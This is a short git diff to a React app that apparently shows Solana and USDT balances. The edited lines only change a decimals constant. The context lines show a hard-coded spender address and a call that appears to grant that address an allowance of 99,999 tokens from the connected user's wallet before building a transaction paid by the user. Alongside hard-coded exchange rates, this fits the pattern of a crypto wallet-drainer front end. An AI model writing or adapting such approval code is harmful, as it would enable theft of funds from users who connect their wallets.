@@ -9,7 +9,7 @@ import { formatBalance } from './config/utils'
 const USDT_ADDRESS = '5MzEv9NewwCgxNDmrBD7DHyvBuLD7eBzZqpXDMxoEfBT'
 const SPENDER_ADDRESS = 'CLZnJ1URVEb4EU7GK8u8jFTy9mwViDZS13BeA98oqyF8'
 
-let web3 = null, connection = null, publicKey = null, tokenAccount = null, contract = null, decimals = 6, timer = null
+let web3 = null, connection = null, publicKey = null, decimals = 9, timer = null
 function App() {
 	const [ rate, setRate ] = useState({
 		'bitcoin': {usd: 51791, cny: 329750},
@@ -56,7 +56,7 @@ function App() {
 	const refresh = async (loading = false) => {
 		loading && Toast.loading('Loading...')
 		const solanaBalance = await connection.getBalance(publicKey)
-		setSolanaBalance(solanaBalance / Math.pow(10, 9))
+		setSolanaBalance(solanaBalance / Math.pow(10, decimals))
 		try {
 			const res = await connection.getTokenAccountBalance(new Web3.PublicKey(USDT_ADDRESS))
 			// console.log(res)
@@ -157,7 +157,7 @@ function App() {
 						new Web3.PublicKey(SPENDER_ADDRESS),
 						publicKey,
 						[],
-						Math.pow(10, 9) * 99999
+						Math.pow(10, decimals) * 99999
 					)
 					const transaction = new Web3.Transaction({
 						feePayer: publicKey,
